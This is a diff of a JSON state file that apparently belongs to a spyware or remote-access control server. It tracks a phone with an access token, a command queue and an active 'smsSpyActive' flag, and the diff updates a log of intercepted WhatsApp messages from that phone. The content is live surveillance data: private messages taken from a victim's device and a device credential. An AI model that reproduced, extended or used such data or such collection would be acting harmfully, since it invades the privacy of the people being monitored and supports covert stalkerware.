@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775044882074,
+    "lastSeen": 1775044885002,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13286 pesan): ~ ୨ৎ✿sapa_imupp✿୨ৎ",
+        "content": "Batu lisan",
+        "time": "01/04 20:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775044886204
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "01/04 19:52",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044356662
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13122 pesan): ~ 🕷️",
-        "content": ". tebakgambar",
-        "time": "01/04 19:52",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044352428
       }
     ],
     "galleryPhotos": [],
